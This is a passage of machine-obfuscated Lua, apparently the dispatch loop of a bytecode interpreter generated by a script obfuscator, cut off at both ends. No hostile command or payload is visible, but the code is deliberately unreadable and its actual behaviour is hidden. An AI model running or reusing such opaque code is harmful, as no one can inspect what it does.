d[f](r(d,f+1,e[t]))end;n=n+1;e=l[n];f=e[o];do return r(d,f,k)end;n=n+1;e=l[n];f=e[o];a={};for e=1,#u do y=u[e];for e=0,#y do h=y[e];s=h[1];b=h[2];if s==d and b>=f then a[b]=s[b];h[1]=a;end;end;end;end else local n=e[o];local o=d[n];for e=n+1,e[t]do h.RwVvSOGQ(o,d[e])end;end end else if f<=138 then if f>=133 then for n=19,90 do if f<138 then a[e[t]]=d[e[o]];break;end;local e=e[o]d[e]=d[e]()break;end;else a[e[t]]=d[e[o]];end else if f<=139 then local a,r,u,y,k,f,h,b,s;for f=0,2 do if f<=0 then d[e[o]]=#d[e[t]];n=n+1;e=l[n];else if-2~=f then for c=19,91 do if f~=1 then h=e[o];b=d[h]s=d[h+2];if(s>0)then if(b>d[h+1])then n=e[t];else d[h+3]=b;end elseif(b<d[h+1])then n=e[t];else d[h+3]=b;end break;end;f=0;while f>-1 do if 2>=f then if 0<f then if 0<=f then repeat if 2>f then r=o;break;end;u=t;until true;else r=o;end else a=e;end else if f<=4 then if 0~=f then repeat if f~=4 then y=a[u];break;end;k=a[r];until true;else k=a[r];end else if f~=4 then for e=25,66 do if f<6 then d(k,y);break;end;f=-2;break;end;else f=-2;end end end f=f+1 end n=n+1;e=l[n];break;end;else h=e[o];b=d[h]s=d[h+2];if(s>0)then if(b>d[h+1])then n=e[t];else d[h+3]=b;end elseif(b<d[h+1])then n=e[t];else d[h+3]=b;end end end end else if f<141 then local o=e[o];local l=d[o]local f=d[o+2];if(f>0)then if(l>d[o+1])then n=e[t];else d[o+3]=l;end elseif(l<d[o+1])then n=e[t];else d[o+3]=l;end else do return d[e[o]]end end end end end else if f<132 then if f>128 then if f<130 then if(e[o]<d[e[b]])then n=n+1;else n=e[t];end;else if 128<=f then repeat if f~=130 then local f,h,r;d[e[o]]=a[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];d[e[o]]={};n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o];h=d[f]r=d[f+2];if(r>0)then if(h>d[f+1])then n=e[t];else d[f+3]=h;end elseif(h<d[f+1])then n=e[t];else d[f+3]=h;end break;end;local k,u,y,s,r,a,f,h;for f=0,3 do if 2<=f then if f==2 then d[e[o]][d[e[t]]]=d[e[b]];n=n+1;e=l[n];else d[e[o]][d[e[t]]]=d[e[b]];end else if-4<f then for b=49,74 do if 1>f then f=0;while f>-1 do if f>3 then if 5<f then if 3<f then for e=30,68 do if 6<f then f=-2;break;end;d[a]=r;break;end;else d[a]=r;end else if 4<f then a=k[u];else r=s[k[y]];end end else if f>1 then if f~=-1 then for e=32,66 do if 3~=f then y=t;break;end;s=d;break;end;else s=d;end else if f~=0 then u=o;else k=e;end end end f=f+1 end n=n+1;e=l[n];break;end;h=e[o]d[h]=d[h](d[h+1])n=n+1;e=l[n];break;end;else h=e[o]d[h]=d[h](d[h+1])n=n+1;e=l[n];end end end until true;else local r,y,u,a,s,k,f,h;for f=0,3 do if 2<=f then if f==2 then d[e[o]][d[e[t]]]=d[e[b]];n=n+1;e=l[n];else d[e[o]][d[e[t]]]=d[e[b]];end else if-4<f then for b=49,74 do if 1>f then f=0;while f>-1 do if f>3 then if 5<f then if 3<f then for e=30,68 do if 6<f then f=-2;break;end;d[k]=s;break;end;else d[k]=s;end else if 4<f then k=r[y];else s=a[r[u]];end end else if f>1 then if f~=-1 then for e=32,66 do if 3~=f then u=t;break;end;a=d;break;end;else a=d;end else if f~=0 then y=o;else r=e;end end end f=f+1 end n=n+1;e=l[n];break;end;h=e[o]d[h]=d[h](d[h+1])n=n+1;e=l[n];break;end;else h=e[o]d[h]=d[h](d[h+1])n=n+1;e=l[n];end end end end end else if 126~=f then for h=31,57 do if 128>f then local f;d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];f=e[o]d[f]=d[f](d[f+1])n=n+1;e=l[n];if d[e[o]]then n=n+1;else n=e[t];end;break;end;local f;d[e[o]]=d[e[t]];n=n+1;e=l[n];f=e[o]d[f](d[f+1])n=n+1;e=l[n];d[e[o]]=a[e[t]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;n=n+1;e=l[n];for e=e[o],e[t]do d[e]=nil;end;break;end;else local f;d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];f=e[o]d[f]=d[f](d[f+1])n=n+1;e=l[n];if d[e[o]]then n=n+1;else n=e[t];end;end end else if 133>=f then if f>129 then repeat if f~=133 then if(d[e[o]]~=e[b])then n=n+1;else n=e[t];end;break;end;do return end;until true;else if(d[e[o]]~=e[b])then n=n+1;else n=e[t];end;end else if 135<=f then if f>131 then repeat if 135<f then local e=e[o];k=e+_-1;for n=e,k do local e=c[n-e];d[n]=e;end;break;end;local f;d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);until true;else local f;d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);end else d[e[o]]();end end end end else if f<159 then if 152>=f then if 149>=f then if 145<f then for h=47,84 do if f<149 then local f;d[e[o]]=d[e[t]];n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,e[t]))break;end;local r,h;for f=0,4 do if 2>f then if f>=-3 then for h=46,65 do if 1~=f then d[e[o]]=s[e[t]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]]+d[e[b]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]]+d[e[b]];n=n+1;e=l[n];end else if f>=3 then if f>=2 then for a=25,69 do if 3<f then r=e[t];h=d[r]for e=r+1,e[b]do h=h..d[e];end;d[e[o]]=h;break;end;d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end else d[e[o]]=d[e[t]]%e[b];n=n+1;e=l[n];end end end break;end;else local f;d[e[o]]=d[e[t]];n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,e[t]))end else if f>150 then if 150<=f then repeat if 151<f then local f,a;for h=0,5 do if 3>h then if h>0 then if h>0 then for f=22,91 do if 1<h then d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]];n=n+1;e=l[n];end else f=e[o];a=d[e[t]];d[f+1]=a;d[f]=a[e[b]];n=n+1;e=l[n];end else if 3<h then if 1<h then repeat if h~=5 then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]]+d[e[b]];until true;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end else f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];end end end break;end;local e=e[o]d[e]=d[e]()until true;else local h,a;for f=0,5 do if 3>f then if f>0 then if f>0 then for h=22,91 do if 1<f then d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]];n=n+1;e=l[n];end else h=e[o];a=d[e[t]];d[h+1]=a;d[h]=a[e[b]];n=n+1;e=l[n];end else if 3<f then if 1<f then repeat if f~=5 then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]]+d[e[b]];until true;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end else h=e[o]d[h]=d[h](r(d,h+1,e[t]))n=n+1;e=l[n];end end end end else local h;for f=0,6 do if 2<f then if f<5 then if f>3 then d[e[o]]=a[e[t]];n=n+1;e=l[n];else d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];end else if 5~=f then d[e[o]]=a[e[t]];else d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];end end else if 1>f then h=e[o]d[h](d[h+1])n=n+1;e=l[n];else if f~=-1 then for h=35,85 do if 2>f then d[e[o]]=a[e[t]];n=n+1;e=l[n];break;end;d[e[o]]=a[e[t]];n=n+1;e=l[n];break;end;else d[e[o]]=a[e[t]];n=n+1;e=l[n];end end end end end end else if f<=155 then if f<=153 then local h;for f=0,6 do if 2>=f then if 0<f then if f>0 then for h=22,79 do if f>1 then d(e[o],e[t]);n=n+1;e=l[n];break;end;d(e[o],e[t]);n=n+1;e=l[n];break;end;else d(e[o],e[t]);n=n+1;e=l[n];end else d(e[o],e[t]);n=n+1;e=l[n];end else if f<=4 then if f>0 then for h=40,61 do if f<4 then d(e[o],e[t]);n=n+1;e=l[n];break;end;d(e[o],e[t]);n=n+1;e=l[n];break;end;else d(e[o],e[t]);n=n+1;e=l[n];end else if f>=3 then repeat if f>5 then d[e[o]]=d[e[t]];break;end;h=e[o]d[h]=d[h](r(d,h+1,e[t]))n=n+1;e=l[n];until true;else d[e[o]]=d[e[t]];end end end end else if f>152 then repeat if 155>f then for f=0,6 do if 2>=f then if 1<=f then if-2<=f then for h=27,61 do if f>1 then d[e[o]]=a[e[t]];n=n+1;e=l[n];break;end;a[e[t]]=d[e[o]];n=n+1;e=l[n];break;end;else d[e[o]]=a[e[t]];n=n+1;e=l[n];end else d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];end else if f>4 then if f>=3 then repeat if f~=6 then d[e[o]]=(e[t]~=0);n=n+1;e=l[n];break;end;a[e[t]]=d[e[o]];until true;else a[e[t]]=d[e[o]];end else if-1<=f then repeat if 4>f then d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];break;end;a[e[t]]=d[e[o]];n=n+1;e=l[n];until true;else a[e[t]]=d[e[o]];n=n+1;e=l[n];end end end end break;end;d[e[o]]=d[e[t]]+d[e[b]];until true;else for f=0,6 do if 2>=f then if 1<=f then if-2<=f then for h=27,61 do if f>1 then d[e[o]]=a[e[t]];n=n+1;e=l[n];break;end;a[e[t]]=d[e[o]];n=n+1;e=l[n];break;end;else d[e[o]]=a[e[t]];n=n+1;e=l[n];end else d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];end else if f>4 then if f>=3 then repeat if f~=6 then d[e[o]]=(e[t]~=0);n=n+1;e=l[n];break;end;a[e[t]]=d[e[o]];until true;else a[e[t]]=d[e[o]];end else if-1<=f then repeat if 4>f then d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];break;end;a[e[t]]=d[e[o]];n=n+1;e=l[n];until true;else a[e[t]]=d[e[o]];n=n+1;e=l[n];end end end end end end else if 156>=f then d[e[o]]=p(g[e[t]],nil,a);else if 158>f then if d[e[o]]then n=n+1;else n=e[t];end;else local l=e[o];local t={};for e=1,#u do local e=u[e];for n=0,#e do local n=e[n];local o=n[1];local e=n[2];if o==d and e>=l then t[e]=o[e];n[1]=t;end;end;end;end end end end else if 164>f then if f<161 then if f<160 then local h,a,r,b,s,f,k,u,y;for f=0,2 do if 1>f then f=0;while f>-1 do if 3<=f then if f>4 then if f==5 then d(s,b);else f=-2;end else if f~=-1 then repeat if f~=3 then s=h[a];break;end;b=h[r];until true;else s=h[a];end end else if 1<=f then if f>1 then r=t;else a=o;end else h=e;end end f=f+1 end n=n+1;e=l[n];else if-3<=f then for c=14,73 do if 2~=f then f=0;while f>-1 do if 3<=f then if 4<f then if 5<f then f=-2;else d(s,b);end else if 1~=f then repeat if f~=3 then s=h[a];break;end;b=h[r];until true;else b=h[r];end end else if 1<=f then if 2>f then a=o;else r=t;end else h=e;end end f=f+1 end n=n+1;e=l[n];break;end;k=e[o];u=d[k]y=d[k+2];if(y>0)then if(u>d[k+1])then n=e[t];else d[k+3]=u;end elseif(u<d[k+1])then n=e[t];else d[k+3]=u;end break;end;else f=0;while f>-1 do if 3<=f then if 4<f then if 5<f then f=-2;else d(s,b);end else if 1~=f then repeat if f~=3 then s=h[a];break;end;b=h[r];until true;else b=h[r];end end else if 1<=f then if 2>f then a=o;else r=t;end else h=e;end end f=f+1 end n=n+1;e=l[n];end end end else if d[e[o]]then n=n+1;else n=e[t];end;end else if f<162 then local h;for f=0,5 do if 2>=f then if 0>=f then d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];else if-3<f then repeat if f<2 then d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;h=e[o]d[h]=d[h](d[h+1])n=n+1;e=l[n];until true;else d[e[o]]=d[e[t]];n=n+1;e=l[n];end end else if 4>f then d[e[o]][d[e[t]]]=d[e[b]];n=n+1;e=l[n];else if f==4 then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];else d[e[o]][d[e[t]]]=d[e[b]];end end end end else if f==163 then local e=e[o]d[e](d[e+1])else for f=0,1 do if-3~=f then for h=16,98 do if f<1 then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;if d[e[o]]then n=n+1;else n=e[t];end;break;end;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end end end end end else if f<=166 then if f<=164 then local f;for h=0,1 do if h==0 then f=e[o]d[f]=d[f]()n=n+1;e=l[n];else if d[e[o]]then n=n+1;else n=e[t];end;end end else if f~=161 then for l=22,87 do if f~=166 then n=e[t];break;end;local e=e[o];k=e+_-1;for n=e,k do local e=c[n-e];d[n]=e;end;break;end;else local e=e[o];k=e+_-1;for n=e,k do local e=c[n-e];d[n]=e;end;end end else if 168>f then local e=e[o]d[e]=d[e](d[e+1])else if 164<=f then for h=12,90 do if 169~=f then d[e[o]]=d[e[t]]-d[e[b]];break;end;local f;for h=0,2 do if 0<h then if-1<h then repeat if 1~=h then d[e[o]][d[e[t]]]=d[e[b]];break;end;d[e[o]]=d[e[t]]-e[b];n=n+1;e=l[n];until true;else d[e[o]]=d[e[t]]-e[b];n=n+1;e=l[n];end else f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];end end break;end;else d[e[o]]=d[e[t]]-d[e[b]];end end end end end end end else if 42<=f then if 63>f then if f<=51 then if f<47 then if 43<f then if 45>f then local e=e[o]d[e]=d[e](r(d,e+1,k))else if 43<=f then for h=30,65 do if f<46 then for f=0,1 do if f==0 then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];else if(d[e[o]]~=d[e[b]])then n=n+1;else n=e[t];end;end end break;end;if(d[e[o]]==e[b])then n=n+1;else n=e[t];end;break;end;else if(d[e[o]]==e[b])then n=n+1;else n=e[t];end;end end else if f~=41 then repeat if f>42 then local n=e[o];local o=d[e[t]];d[n+1]=o;d[n]=o[e[b]];break;end;d[e[o]][e[t]]=d[e[b]];until true;else local o=e[o];local n=d[e[t]];d[o+1]=n;d[o]=n[e[b]];end end else if f<49 then if f<48 then do return d[e[o]]end else local e=e[o]local o,n=y(d[e](d[e+1]))k=n+e-1 local n=0;for e=e,k do n=n+1;d[e]=o[n];end;end else if 49<f then if f>=46 then for h=10,63 do if 50~=f then local f;d[e[o]]=d[e[t]];n=n+1;e=l[n];f=e[o]d[f](d[f+1])n=n+1;e=l[n];d[e[o]]=a[e[t]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;break;end;if not d[e[o]]then n=n+1;else n=e[t];end;break;end;else if not d[e[o]]then n=n+1;else n=e[t];end;end else if not d[e[o]]then n=n+1;else n=e[t];end;end end end else if f>56 then if f<=59 then if 58<=f then if f>57 then repeat if 59~=f then local n=e[o]d[n]=d[n](r(d,n+1,e[t]))break;end;local h,u,s,b,k,f,r;f=0;while f>-1 do if 3>f then if f>0 then if 2==f then s=t;else u=o;end else h=e;end else if 4<f then if 3<=f then for e=10,86 do if 5<f then f=-2;break;end;d(k,b);break;end;else f=-2;end else if f>=1 then for e=43,97 do if f~=4 then b=h[s];break;end;k=h[u];break;end;else b=h[s];end end end f=f+1 end n=n+1;e=l[n];r=e[o]d[r](d[r+1])n=n+1;e=l[n];d[e[o]]=a[e[t]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;n=n+1;e=l[n];for e=e[o],e[t]do d[e]=nil;end;until true;else local n=e[o]d[n]=d[n](r(d,n+1,e[t]))end else local e=e[o]d[e]=d[e](d[e+1])end else if 60>=f then local a,u,r,k,s,f,h,b,y;for f=0,2 do if f>0 then if f~=1 then h=e[o];b=d[h]y=d[h+2];if(y>0)then if(b>d[h+1])then n=e[t];else d[h+3]=b;end elseif(b<d[h+1])then n=e[t];else d[h+3]=b;end else f=0;while f>-1 do if 2>=f then if f<=0 then a=e;else if f~=-3 then repeat if f>1 then r=t;break;end;u=o;until true;else r=t;end end else if f<=4 then if f<4 then k=a[r];else s=a[u];end else if f>=1 then repeat if f>5 then f=-2;break;end;d(s,k);until true;else f=-2;end end end f=f+1 end n=n+1;e=l[n];end else d[e[o]]=#d[e[t]];n=n+1;e=l[n];end end else if f>=57 then repeat if 61~=f then local f;s[e[t]]=d[e[o]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];f=e[o]d[f](d[f+1])n=n+1;e=l[n];d[e[o]]=a[e[t]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;break;end;d[e[o]]=(e[t]~=0);until true;else local f;s[e[t]]=d[e[o]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];f=e[o]d[f](d[f+1])n=n+1;e=l[n];d[e[o]]=a[e[t]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;end end end else if f<54 then if 49~=f then repeat if f>52 then local l,a,r,b,f,h;local n=0;while n>-1 do if 4<=n then if n>5 then if 4<n then repeat if 6~=n then n=-2;break;end;d[h]=f;until true;else d[h]=f;end else if n>2 then repeat if n~=5 then f=b[l[r]];break;end;h=l[a];until true;else f=b[l[r]];end end else if n>1 then if n==2 then r=t;else b=d;end else if-2~=n then repeat if 1>n then l=e;break;end;a=o;until true;else a=o;end end end n=n+1 end break;end;local l=e[o];local t={};for e=1,#u do local e=u[e];for n=0,#e do local n=e[n];local o=n[1];local e=n[2];if o==d and e>=l then t[e]=o[e];n[1]=t;end;end;end;until true;else local l=e[o];local t={};for e=1,#u do local e=u[e];for n=0,#e do local e=e[n];local o=e[1];local n=e[2];if o==d and n>=l then t[n]=o[n];e[1]=t;end;end;end;end else if f>=55 then if 56==f then local f,b,s,h;f=e[o]d[f]=d[f](d[f+1])n=n+1;e=l[n];f=e[o]d[f]=d[f]()n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d[e[o]]=a[e[t]];n=n+1;e=l[n];f=e[o]b,s=y(d[f](r(d,f+1,e[t])))k=s+f-1 h=0;for e=f,k do h=h+1;d[e]=b[h];end;n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,k))else d[e[o]]=d[e[t]]%d[e[b]];end else local h,b,a,t,r,f;for s=0,1 do if s>-2 then for k=35,53 do if 1~=s then h=e[o]d[h](d[h+1])n=n+1;e=l[n];break;end;h=e[o];b={};for e=1,#u do a=u[e];for e=0,#a do t=a[e];r=t[1];f=t[2];if r==d and f>=h then b[f]=r[f];t[1]=b;end;end;end;break;end;else h=e[o];b={};for e=1,#u do a=u[e];for e=0,#a do t=a[e];r=t[1];f=t[2];if r==d and f>=h then b[f]=r[f];t[1]=b;end;end;end;end end end end end end else if f<74 then if f<68 then if f>=65 then if f<66 then local f;for h=0,4 do if 1<h then if h>=3 then if-1~=h then repeat if h<4 then f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];break;end;if(d[e[o]]~=e[b])then n=n+1;else n=e[t];end;until true;else f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];end else d(e[o],e[t]);n=n+1;e=l[n];end else if h>-1 then repeat if 1~=h then d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;d(e[o],e[t]);n=n+1;e=l[n];until true;else d[e[o]]=d[e[t]];n=n+1;e=l[n];end end end else if f<67 then d[e[o]]=d[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);else d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;end end else if 64==f then local f;d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);else local f;d[e[o]]=d[e[t]];n=n+1;e=l[n];f=e[o]d[f](d[f+1])n=n+1;e=l[n];d[e[o]]=a[e[t]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;n=n+1;e=l[n];for e=e[o],e[t]do d[e]=nil;end;end end else if f<=70 then if 69<=f then if 65<f then for h=35,71 do if 70>f then for f=0,6 do if 3<=f then if 5<=f then if f>1 then repeat if f>5 then d(e[o],e[t]);break;end;d[e[o]]=d[e[t]]-d[e[b]];n=n+1;e=l[n];until true;else d(e[o],e[t]);end else if 0<f then for h=42,61 do if 4~=f then d(e[o],e[t]);n=n+1;e=l[n];break;end;d[e[o]]=#d[e[t]];n=n+1;e=l[n];break;end;else d(e[o],e[t]);n=n+1;e=l[n];end end else if f>=1 then if f~=2 then d(e[o],e[t]);n=n+1;e=l[n];else d(e[o],e[t]);n=n+1;e=l[n];end else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end end end break;end;local n=e[o]d[n]=d[n](r(d,n+1,e[t]))break;end;else local n=e[o]d[n]=d[n](r(d,n+1,e[t]))end else s[e[t]]=d[e[o]];end else if 72<=f then if f>68 then for n=14,59 do if f<73 then local f,h,r,b,l;local n=0;while n>-1 do if 2<n then if n>=5 then if n~=3 then repeat if 5~=n then n=-2;break;end;d(l,b);until true;else d(l,b);end else if n>=1 then for e=49,78 do if 3~=n then l=f[h];break;end;b=f[r];break;end;else l=f[h];end end else if n>=1 then if 1~=n then r=t;else h=o;end else f=e;end end n=n+1 end break;end;d[e[o]][d[e[t]]]=d[e[b]];break;end;else d[e[o]][d[e[t]]]=d[e[b]];end else d[e[o]]=d[e[t]]*e[b];end end end else if f<79 then if 75>=f then if 70<f then repeat if f<75 then if(d[e[o]]==e[b])then n=n+1;else n=e[t];end;break;end;local f;d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];f=e[o]d[f]=d[f](d[f+1])n=n+1;e=l[n];d[e[o]][d[e[t]]]=d[e[b]];n=n+1;e=l[n];do return end;until true;else local f;d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];f=e[o]d[f]=d[f](d[f+1])n=n+1;e=l[n];d[e[o]][d[e[t]]]=d[e[b]];n=n+1;e=l[n];do return end;end else if f>=77 then if 73<=f then for n=33,85 do if 77<f then d[e[o]]=p(g[e[t]],nil,a);break;end;local n=e[o];local o=d[n];for e=n+1,e[t]do h.RwVvSOGQ(o,d[e])end;break;end;else local n=e[o];local o=d[n];for e=n+1,e[t]do h.RwVvSOGQ(o,d[e])end;end else d[e[o]]=s[e[t]];end end else if f<82 then if 80<=f then if 79<=f then repeat if 80~=f then d[e[o]]=d[e[t]]-e[b];break;end;local n=e[o]local o,e=y(d[n](r(d,n+1,e[t])))k=e+n-1 local e=0;for n=n,k do e=e+1;d[n]=o[e];end;until true;else local n=e[o]local o,e=y(d[n](r(d,n+1,e[t])))k=e+n-1 local e=0;for n=n,k do e=e+1;d[n]=o[e];end;end else d[e[o]]=d[e[t]]-e[b];end else if 82<f then if 81<=f then for h=32,81 do if f~=83 then d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;break;end;local a,s,k,l,f,r,h;local n=0;while n>-1 do if 3<=n then if 4>=n then if n>-1 then for e=26,59 do if n~=3 then h=d[f];for e=1+f,l[k]do h=h..d[e];end;break;end;r=l[a];break;end;else r=l[a];end else if 6==n then n=-2;else d[r]=h;end end else if 1<=n then if-1~=n then for d=20,82 do if 1~=n then f=l[s];break;end;l=e;break;end;else f=l[s];end else a=o;s=t;k=b;end end n=n+1 end break;end;else local r,a,k,l,h,s,f;local n=0;while n>-1 do if 3<=n then if 4>=n then if n>-1 then for e=26,59 do if n~=3 then f=d[h];for e=1+h,l[k]do f=f..d[e];end;break;end;s=l[r];break;end;else s=l[r];end else if 6==n then n=-2;else d[s]=f;end end else if 1<=n then if-1~=n then for d=20,82 do if 1~=n then h=l[a];break;end;l=e;break;end;else h=l[a];end else r=o;a=t;k=b;end end n=n+1 end end else d[e[o]]={};end end end end end else if f<=20 then if 10<=f then if 14<f then if 17>=f then if 16>f then for e=e[o],e[t]do d[e]=nil;end;else if 17==f then local k,r,a,l,h,s,f;local n=0;while n>-1 do if n>2 then if n>4 then if 6~=n then d[s]=f;else n=-2;end else if n~=4 then s=l[k];else f=d[h];for e=1+h,l[a]do f=f..d[e];end;end end else if 0<n then if-1<n then repeat if 1~=n then h=l[r];break;end;l=e;until true;else h=l[r];end else k=o;r=t;a=b;end end n=n+1 end else local f;d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];d(e[o],e[t]);n=n+1;e=l[n];f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];end end else if 18<f then if 18<=f then for l=26,67 do if 19~=f then n=e[t];break;end;s[e[t]]=d[e[o]];break;end;else s[e[t]]=d[e[o]];end else d[e[o]]=d[e[t]]+e[b];end end else if f<12 then if 8~=f then for h=21,73 do if 10~=f then d[e[o]]=a[e[t]];break;end;d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];d[e[o]]=(e[t]~=0);n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]][e[b]];break;end;else d[e[o]]=a[e[t]];end else if 12>=f then local h;for f=0,6 do if 2<f then if 4>=f then if f==4 then d[e[o]]=d[e[t]];n=n+1;e=l[n];else d[e[o]]=d[e[t]];n=n+1;e=l[n];end else if f>2 then for b=41,56 do if 6>f then d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;h=e[o]d[h]=d[h](r(d,h+1,e[t]))break;end;else d[e[o]]=d[e[t]];n=n+1;e=l[n];end end else if f<1 then d[e[o]]=s[e[t]];n=n+1;e=l[n];else if-3<=f then for h=19,96 do if 2~=f then d[e[o]]=s[e[t]];n=n+1;e=l[n];break;end;d[e[o]]=s[e[t]];n=n+1;e=l[n];break;end;else d[e[o]]=s[e[t]];n=n+1;e=l[n];end end end end else if 13==f then d[e[o]]=d[e[t]]-d[e[b]];else d[e[o]]=d[e[t]]+d[e[b]];end end end end else if 5>f then if f<=1 then if 0~=f then local h;for f=0,3 do if 1<f then if 0<=f then repeat if 2~=f then if d[e[o]]then n=n+1;else n=e[t];end;break;end;h=e[o]d[h]=d[h](r(d,h+1,e[t]))n=n+1;e=l[n];until true;else if d[e[o]]then n=n+1;else n=e[t];end;end else if-4<f then repeat if 1>f then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];until true;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end end end else d[e[o]]={};end else if 3<=f then if 3==f then d[e[o]]=d[e[t]][d[e[b]]];else local 